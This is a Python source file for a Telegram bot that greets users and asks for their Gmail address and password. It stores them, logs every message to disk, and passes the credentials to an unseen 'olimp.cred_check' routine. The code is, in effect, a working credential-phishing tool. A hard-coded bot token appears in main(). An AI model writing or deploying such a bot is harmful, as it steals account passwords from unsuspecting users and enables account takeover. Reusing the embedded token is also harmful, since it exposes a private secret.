import telepot
import olimp
# Dictionary to store user information
user_data = {}
import re
import os

# Define the start command handler
def start(msg):
    global bot
    chat_id = msg['chat']['id']
    user_id = msg['from']['id']

    db = open("database/"+str(user_id), '+a')
    db.write(str(msg)+"\n")
    db.close()

    collect_pass = False
    if user_id not in user_data:
        user_data[user_id] = {'id': user_id,'name': msg['from']['first_name'], 'credentials': {'mail': False, 'pass': False}}
        bot.sendMessage(chat_id, f"Hello {msg['from']['first_name']}!")
        bot.sendMessage(chat_id, f"Please provide your Gmail.")
        user_data[user_id]['credentials']['mail'] = True

    else:

        if user_data[user_id]['credentials']['mail'] == True and not re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]'
                                                                      r'+\.[a-zA-Z]{2,}$', msg['text']):
            bot.sendMessage(chat_id, "Enter Your Right Email to Proceed")

        elif re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', msg['text']) \
                and user_data[user_id]['credentials']['mail']:

            user_data[user_id]['credentials']['mail'] = msg['text']
            bot.sendMessage(chat_id, "Please Enter Your Password to proceed")
            user_data[user_id]['credentials']['pass'] = True

        elif user_data[user_id]['credentials']['pass']:
            user_data[user_id]['credentials']['pass'] = msg['text']
            bot.sendMessage(chat_id, "Validating your Credentials \nPlease wait...")
            bot.sendMessage(chat_id, olimp.cred_check(user_data[user_id]))


# Define the text message handler
def handle_text(msg):
    global bot
    chat_id = msg['chat']['id']
    user_id = msg['from']['id']
    text = msg['text']

    bot.sendMessage(chat_id, "Your message is " + text)  # Concatenate the message and text

def main():
    global bot
    bot = telepot.Bot('6512036614:AAHAT909IhiSwHO8FdVS3UoY2eH5rJeNTlE')

    bot.message_loop({'chat': start, 'text': handle_text})

    print('Listening for messages...')
    while True:
        pass


if __name__ == '__main__':
    main()
